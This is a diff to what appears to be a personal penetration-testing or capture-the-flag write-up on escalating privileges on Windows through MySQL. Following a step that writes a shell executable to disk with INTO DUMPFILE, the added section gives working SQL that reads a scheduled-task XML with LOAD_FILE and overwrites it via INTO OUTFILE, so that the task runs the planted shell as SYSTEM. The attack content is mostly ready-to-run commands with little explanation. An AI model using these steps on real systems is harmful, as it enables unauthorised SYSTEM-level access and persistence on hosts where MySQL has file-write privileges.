@@ -146,3 +146,47 @@ SELECT 0x[your hex data] INTO DUMPFILE 'C:\\Windows\\Temp\\shell.exe'
 ```
 
 after execution i found it via my shell and varified that it exists 
+it get executed and then i got the shell
+
+****
+### Overwrite Task XML
+
+Task XMLs are stored at:
+
+```
+C:\Windows\System32\Tasks\TaskName
+C:\Windows\SysWOW64\Tasks\TaskName
+```
+
+Read original XML first via MySQL:
+
+sql
+
+```sql
+SELECT LOAD_FILE('C:\\Windows\\System32\\Tasks\\TaskName');
+```
+
+Write new XML pointing to your shell:
+
+sql
+
+```sql
+SELECT '<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <Enabled>true</Enabled>
+  </Settings>
+  <Actions>
+    <Exec>
+      <Command>C:\Windows\Temp\shell.exe</Command>
+    </Exec>
+  </Actions>
+</Task>'
+INTO OUTFILE 'C:\\Windows\\System32\\Tasks\\TaskName';
+```
